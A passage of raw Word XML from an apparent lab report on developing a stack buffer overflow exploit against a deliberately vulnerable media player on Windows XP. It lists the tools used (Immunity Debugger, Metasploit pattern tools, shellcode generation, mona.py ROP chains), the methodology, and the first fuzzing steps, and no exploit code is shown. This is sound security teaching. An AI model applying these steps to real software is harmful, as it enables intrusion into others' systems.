          <w:p w14:paraId="5674E2B7" w14:textId="78F731F8" w:rsidR="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="00CC2432">
            <w:r>
              <w:t>Windows XP SP3 Virtual Machine (.vmx file)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5D2A7B11" w14:textId="0D625142" w:rsidR="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="00CC2432">
            <w:r>
              <w:t xml:space="preserve">Windows XP was used here because it assigns the same virtual memory space to processes each time they are run. This is primarily what makes buffer overflow attacks </w:t>
            </w:r>
            <w:r w:rsidR="00056019">
              <w:t>possible,</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> and it allows for predictable replication of the actions performed throughout the procedure. </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC2432" w14:paraId="5E3A4660" w14:textId="77777777" w:rsidTr="006274C0">
        <w:trPr>
          <w:trHeight w:val="2845"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0496623A" w14:textId="582749A8" w:rsidR="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="00CC2432">
            <w:r>
              <w:t>Immunity Debugger</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="76411E65" w14:textId="31AE631F" w:rsidR="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="00CC2432">
            <w:r>
              <w:t xml:space="preserve">Used to analyse the stack, the instructions pointer, registers, file dependencies, machine code, shellcode, crash information, and data dump. This was the primary application used to attach and inspect the media player process as well as checking the progress made with the exploit. </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70A00097" w14:textId="77777777" w:rsidR="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="00CC2432"/>
          <w:p w14:paraId="18430598" w14:textId="7536CB7D" w:rsidR="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="00CC2432">
            <w:r>
              <w:t xml:space="preserve">Debuggers like OllyDB work fundamentally the same, but more consistent results were observed </w:t>
            </w:r>
            <w:r w:rsidR="00056019">
              <w:t>where</w:t>
            </w:r>
            <w:r w:rsidR="00372725">
              <w:t>as</w:t>
            </w:r>
            <w:r w:rsidR="00056019">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t>OllyDB often display</w:t>
            </w:r>
            <w:r w:rsidR="00056019">
              <w:t>ed</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> the incorrect memory location of application crashes.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC2432" w14:paraId="09FF87D5" w14:textId="77777777" w:rsidTr="006274C0">
        <w:trPr>
          <w:trHeight w:val="474"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7CAAA684" w14:textId="4295249E" w:rsidR="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="00CC2432">
            <w:r>
              <w:t>Perl</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="39C30765" w14:textId="7BE4D746" w:rsidR="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="00CC2432">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="1021"/>
              </w:tabs>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">A versatile programming language well suited for simple scripts. </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC2432" w14:paraId="4C566211" w14:textId="77777777" w:rsidTr="006274C0">
        <w:trPr>
          <w:trHeight w:val="222"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2B0ABD90" w14:textId="340E7C57" w:rsidR="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="00CC2432">
            <w:r>
              <w:t>Notepad++</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="56170637" w14:textId="362B504B" w:rsidR="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="00CC2432">
            <w:r>
              <w:t>Coding visualisation and debugging tool.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC2432" w14:paraId="79E0C524" w14:textId="77777777" w:rsidTr="006274C0">
        <w:trPr>
          <w:trHeight w:val="474"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="28FD0A35" w14:textId="5EE70E9B" w:rsidR="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="00CC2432">
            <w:r>
              <w:t>Metasploit Framework Tool - pattern_create</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0E7D598A" w14:textId="11C31D35" w:rsidR="00CC2432" w:rsidRDefault="00056019" w:rsidP="00CC2432">
            <w:r>
              <w:t>Used to create a unique pattern to determine exactly where the instruction pointer is located</w:t>
            </w:r>
            <w:r w:rsidR="008F23FC">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC2432" w14:paraId="716762AB" w14:textId="77777777" w:rsidTr="006274C0">
        <w:trPr>
          <w:trHeight w:val="474"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0C618161" w14:textId="02F1BA70" w:rsidR="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="00CC2432">
            <w:r>
              <w:t>Metasploit Framework Tool - pattern_offset</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="13AD10BA" w14:textId="3139CEE6" w:rsidR="00CC2432" w:rsidRDefault="00056019" w:rsidP="00CC2432">
            <w:r>
              <w:t>Shows exactly how many bytes are required before adding shellcode</w:t>
            </w:r>
            <w:r w:rsidR="008F23FC">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC2432" w14:paraId="7F8F5F20" w14:textId="77777777" w:rsidTr="006274C0">
        <w:trPr>
          <w:trHeight w:val="222"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="137386B8" w14:textId="3D136AEC" w:rsidR="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="00CC2432">
            <w:r>
              <w:t>Metasploit Framework MSFGUI</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5204070D" w14:textId="12571127" w:rsidR="00CC2432" w:rsidRDefault="00056019" w:rsidP="00CC2432">
            <w:r>
              <w:t>Automated shellcode generation tool</w:t>
            </w:r>
            <w:r w:rsidR="008F23FC">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC2432" w14:paraId="3BD9FA26" w14:textId="77777777" w:rsidTr="006274C0">
        <w:trPr>
          <w:trHeight w:val="474"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5B5AC855" w14:textId="2CF9B53B" w:rsidR="00CC2432" w:rsidRDefault="00CC2432" w:rsidP="00CC2432">
            <w:r w:rsidRPr="00760EA5">
              <w:t xml:space="preserve">Findjmp (by Ryan </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00760EA5">
              <w:t>Permeh</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00760EA5">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00760EA5">
              <w:t>Eeye</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00760EA5">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="44C45ABE" w14:textId="5069E5B3" w:rsidR="00CC2432" w:rsidRDefault="00056019" w:rsidP="00CC2432">
            <w:r>
              <w:t xml:space="preserve">Locates the JMP (Jump) instruction in connected DLL files used to enable shellcode execution. </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001A3AB1" w14:paraId="0A8EFD60" w14:textId="77777777" w:rsidTr="006274C0">
        <w:trPr>
          <w:trHeight w:val="474"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="608F2A26" w14:textId="5DA958D4" w:rsidR="001A3AB1" w:rsidRPr="00760EA5" w:rsidRDefault="001A3AB1" w:rsidP="00CC2432">
            <w:r>
              <w:lastRenderedPageBreak/>
              <w:t>Python IDLE Shell (2.7)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6F50D1D6" w14:textId="2C76BA12" w:rsidR="001A3AB1" w:rsidRDefault="00E74F68" w:rsidP="00CC2432">
            <w:r>
              <w:t>Used for its built-in memory location calculator.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001A3AB1" w14:paraId="7E51E4BE" w14:textId="77777777" w:rsidTr="006274C0">
        <w:trPr>
          <w:trHeight w:val="474"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="52E585D9" w14:textId="1F8B771B" w:rsidR="001A3AB1" w:rsidRPr="00760EA5" w:rsidRDefault="001A3AB1" w:rsidP="00CC2432">
            <w:r>
              <w:t>Mona.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4A4CC5ED" w14:textId="1C71C2AB" w:rsidR="001A3AB1" w:rsidRDefault="00E74F68" w:rsidP="00CC2432">
            <w:r>
              <w:t>An Immunity Debugger addon that calculates ROP Chains.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E74F68" w14:paraId="7C033D2F" w14:textId="77777777" w:rsidTr="006274C0">
        <w:trPr>
          <w:trHeight w:val="474"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6DF31FE7" w14:textId="7EB0452F" w:rsidR="00E74F68" w:rsidRDefault="00E74F68" w:rsidP="00CC2432">
            <w:r>
              <w:t>Msvcrt.dll</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="231BC938" w14:textId="605FF79D" w:rsidR="00E74F68" w:rsidRDefault="00E74F68" w:rsidP="00CC2432">
            <w:r>
              <w:t xml:space="preserve">Microsoft </w:t>
            </w:r>
            <w:r w:rsidR="00AE09B1">
              <w:t>.</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:t>dll</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:t xml:space="preserve"> file that features valid ROP instructions to execute shellcode on a DEP enabled system.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008F23FC" w14:paraId="1C015E2C" w14:textId="77777777" w:rsidTr="006274C0">
        <w:trPr>
          <w:trHeight w:val="474"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3D2F365D" w14:textId="6B439B42" w:rsidR="008F23FC" w:rsidRDefault="008F23FC" w:rsidP="00CC2432">
            <w:r>
              <w:t>Rop2perl.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4917" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5745635A" w14:textId="39B93C9C" w:rsidR="008F23FC" w:rsidRDefault="008F23FC" w:rsidP="00CC2432">
            <w:r>
              <w:t>Converts mona.py output into usable Perl code.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4D4E6F34" w14:textId="4F5ABAD9" w:rsidR="004C3F85" w:rsidRDefault="00D40998" w:rsidP="004C3F85">
      <w:r>
        <w:t>Table 1 - A list of the tools used and their descriptions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7528B2C6" w14:textId="77777777" w:rsidR="006D5BB6" w:rsidRDefault="006D5BB6" w:rsidP="006D5BB6">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="17" w:name="_Toc103326456"/>
      <w:r>
        <w:t xml:space="preserve">Hardware </w:t>
      </w:r>
      <w:r w:rsidRPr="006D5BB6">
        <w:t>Specifications</w:t>
      </w:r>
      <w:bookmarkEnd w:id="17"/>
    </w:p>
    <w:p w14:paraId="355F59F4" w14:textId="77777777" w:rsidR="006D5BB6" w:rsidRDefault="006D5BB6" w:rsidP="006D5BB6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="236" w:afterAutospacing="0"/>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>CPU: AMD Ryzen 7 3700X 8-core</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260AC194" w14:textId="77777777" w:rsidR="006D5BB6" w:rsidRDefault="006D5BB6" w:rsidP="006D5BB6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="236" w:afterAutospacing="0"/>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>RAM: 16Gb DDR4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B11FBD" w14:textId="77777777" w:rsidR="006D5BB6" w:rsidRDefault="006D5BB6" w:rsidP="006D5BB6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="236" w:afterAutospacing="0"/>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>GPU: AMD Radeon RX590 Red Devil</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66BEFC96" w14:textId="6016920C" w:rsidR="006D5BB6" w:rsidRDefault="006D5BB6" w:rsidP="006D5BB6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="236" w:afterAutospacing="0"/>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Storage: 500Gb SSD, 2TB HDD</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD16981" w14:textId="4732C9B7" w:rsidR="006D5BB6" w:rsidRDefault="006D5BB6" w:rsidP="006D5BB6">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="18" w:name="_Toc103326457"/>
      <w:r w:rsidRPr="006D5BB6">
        <w:t>Methodology</w:t>
      </w:r>
      <w:bookmarkEnd w:id="18"/>
    </w:p>
    <w:p w14:paraId="2046C2AF" w14:textId="5E196DDD" w:rsidR="00820C38" w:rsidRDefault="00F8417D" w:rsidP="006D5BB6">
      <w:r>
        <w:t>Steflan Security’s “Stack Buffer Overflow Process”</w:t>
      </w:r>
      <w:r w:rsidR="00585838">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:id w:val="2043628406"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00585838">
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="00585AA4">
            <w:rPr>
              <w:lang w:val="en-GB"/>
            </w:rPr>
            <w:instrText xml:space="preserve">CITATION Ste21 \n  \t  \l 2057 </w:instrText>
          </w:r>
          <w:r w:rsidR="00585838">
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00585AA4" w:rsidRPr="00585AA4">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB"/>
            </w:rPr>
            <w:t>(2021)</w:t>
          </w:r>
          <w:r w:rsidR="00585838">
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r>
        <w:t xml:space="preserve"> was used as the methodology for this procedure as i</w:t>
      </w:r>
      <w:r w:rsidR="00585838">
        <w:t>ts purpose is to prepare Offensive Security</w:t>
      </w:r>
      <w:r w:rsidR="00725166" w:rsidRPr="00585838">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00585838">
        <w:t>students for the OSCP (</w:t>
      </w:r>
      <w:r w:rsidR="00585838" w:rsidRPr="00585838">
        <w:t>Offensive Security Certified Professional)</w:t>
      </w:r>
      <w:r w:rsidR="00585838">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00725166">
        <w:t>Certification Exam</w:t>
      </w:r>
      <w:r w:rsidR="00585838">
        <w:t xml:space="preserve">, a certification highly sought after by leading cybersecurity teams across some of the world’s biggest firms such as Microsoft, Amazon, and IBM </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:id w:val="69855980"/>
          <w:citation/>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00585838">
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="00585838">
            <w:rPr>
              <w:lang w:val="en-GB"/>
            </w:rPr>
            <w:instrText xml:space="preserve"> CITATION Off22 \l 2057 </w:instrText>
          </w:r>
          <w:r w:rsidR="00585838">
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00DC56CC" w:rsidRPr="00DC56CC">
            <w:rPr>
              <w:noProof/>
              <w:lang w:val="en-GB"/>
            </w:rPr>
            <w:t>(Offensive Security, 2022)</w:t>
          </w:r>
          <w:r w:rsidR="00585838">
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00585838">
        <w:t>. I</w:t>
      </w:r>
      <w:r w:rsidR="00725166">
        <w:t xml:space="preserve">t </w:t>
      </w:r>
      <w:r w:rsidR="00585838">
        <w:t xml:space="preserve">also </w:t>
      </w:r>
      <w:r>
        <w:t>covers all the necessary steps from testing the crash to generating and adding shellcode in a neat, easy to follow diagram</w:t>
      </w:r>
      <w:r w:rsidR="004B7710">
        <w:t xml:space="preserve"> and method</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62FFA690" w14:textId="4ADE0E97" w:rsidR="00F8417D" w:rsidRDefault="00F8417D" w:rsidP="00C7142D">
      <w:r>
        <w:t xml:space="preserve">Each step is explained and demonstrated </w:t>
      </w:r>
      <w:r w:rsidR="00725166">
        <w:t>throughout Tutorial 1 and Tutorial 2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, covering all </w:t>
      </w:r>
      <w:r w:rsidR="004B7710">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t>practical and theoretical knowledge required.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43E28156" w14:textId="0F4BB31F" w:rsidR="007C5D85" w:rsidRPr="006D5BB6" w:rsidRDefault="007C5D85" w:rsidP="00C7142D">
      <w:r>
        <w:t>See Appendix C2 for the Steflan buffer overflow process diagram.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="265AE284" w14:textId="6F4712F1" w:rsidR="004D7B3D" w:rsidRDefault="00F8417D" w:rsidP="008332D2">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="19" w:name="_Toc102919473"/>
      <w:bookmarkStart w:id="20" w:name="_Toc103326458"/>
      <w:r>
        <w:t>Tutorial</w:t>
      </w:r>
      <w:r w:rsidR="00534A08">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009525A9">
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00534A08">
        <w:t xml:space="preserve"> – No DEP</w:t>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
      <w:bookmarkEnd w:id="20"/>
    </w:p>
    <w:p w14:paraId="116D1A5C" w14:textId="2850052D" w:rsidR="00F8417D" w:rsidRDefault="00F8417D" w:rsidP="00C66B0A">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="21" w:name="_Toc103326459"/>
      <w:r>
        <w:t>Fuzzing</w:t>
      </w:r>
      <w:r w:rsidR="00C66B0A">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:t>Replicating the Crash</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w14:paraId="3C6F86C5" w14:textId="722A4115" w:rsidR="00C66B0A" w:rsidRDefault="00C66B0A" w:rsidP="00C66B0A">
      <w:r>
        <w:t xml:space="preserve">The first step in this exploit </w:t>
      </w:r>
      <w:r w:rsidR="00A23579">
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to load the application </w:t>
      </w:r>
      <w:r w:rsidRPr="00C66B0A">
        <w:t>into Immunity Debugger</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This </w:t>
      </w:r>
      <w:r w:rsidR="00A23579">
        <w:t>can be</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> done by double clicking on 2003114.exe - the </w:t>
      </w:r>
      <w:r w:rsidRPr="00C66B0A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Vulnerable Media Player</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">- and </w:t>
      </w:r>
      <w:r w:rsidR="00356068">
        <w:t xml:space="preserve">then </w:t>
      </w:r>
      <w:r w:rsidRPr="00C66B0A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Immunity Debugger</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Once these were both opened, the media player </w:t>
      </w:r>
      <w:r w:rsidR="00A23579">
        <w:t xml:space="preserve">must be </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">attached as a process and </w:t>
      </w:r>
      <w:r w:rsidR="00116860">
        <w:t xml:space="preserve">then </w:t>
      </w:r>
      <w:r>
        <w:t>run</w:t>
      </w:r>
      <w:r w:rsidR="00356068">
        <w:t xml:space="preserve"> by Pressing F9 or optionally clicking the “</w:t>
      </w:r>
      <w:r w:rsidR="00356068">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6EE10A38" wp14:editId="661A9F16">
            <wp:extent cx="161925" cy="152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3044" cy="153453"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00356068">
        <w:t>” button on the debugger’s toolbar</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C509D37" w14:textId="77777777" w:rsidR="00162D59" w:rsidRDefault="00162D59" w:rsidP="00C66B0A"/>
    <w:p w14:paraId="120E8C3F" w14:textId="77777777" w:rsidR="00356068" w:rsidRDefault="00C66B0A" w:rsidP="00356068">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4EAB2A6D" wp14:editId="38ECC28C">
            <wp:extent cx="5210175" cy="1771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a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5210175" cy="1771650"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A5E814" w14:textId="236ADF32" w:rsidR="00C66B0A" w:rsidRDefault="00356068" w:rsidP="00356068">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - The "Attach" button can be found under "File" on the top toolbar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DFC4267" w14:textId="77777777" w:rsidR="00162D59" w:rsidRPr="00162D59" w:rsidRDefault="00162D59" w:rsidP="00162D59"/>
    <w:p w14:paraId="40C5E74E" w14:textId="2FDCBE0F" w:rsidR="00356068" w:rsidRDefault="00356068" w:rsidP="00356068">
      <w:r>
        <w:t xml:space="preserve">Once the process </w:t>
      </w:r>
      <w:r w:rsidR="00A23579">
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> attached, the next step </w:t>
      </w:r>
      <w:r w:rsidR="00A23579">
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to overflow the program’s buffer</w:t>
      </w:r>
      <w:r w:rsidR="003B2BA8">
        <w:t xml:space="preserve"> with characters (</w:t>
      </w:r>
      <w:r w:rsidR="00AE09B1">
        <w:t>As</w:t>
      </w:r>
      <w:r w:rsidR="003B2BA8">
        <w:t xml:space="preserve"> in this case)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to prove the vulnerability exists and could be developed further into something malicious.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DB2965A" w14:textId="7AC1B87C" w:rsidR="005E1F6C" w:rsidRPr="008A26FF" w:rsidRDefault="00A23579" w:rsidP="00356068">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Create a </w:t>
      </w:r>
      <w:r w:rsidR="00AE09B1">
        <w:t>Perl</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file (crash1.pl) on the desktop or in a folder</w:t>
      </w:r>
      <w:r w:rsidR="000867B4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005D6A76">
        <w:t xml:space="preserve">with </w:t>
      </w:r>
      <w:r w:rsidR="008A26FF">
        <w:t xml:space="preserve">contents detailed in </w:t>
      </w:r>
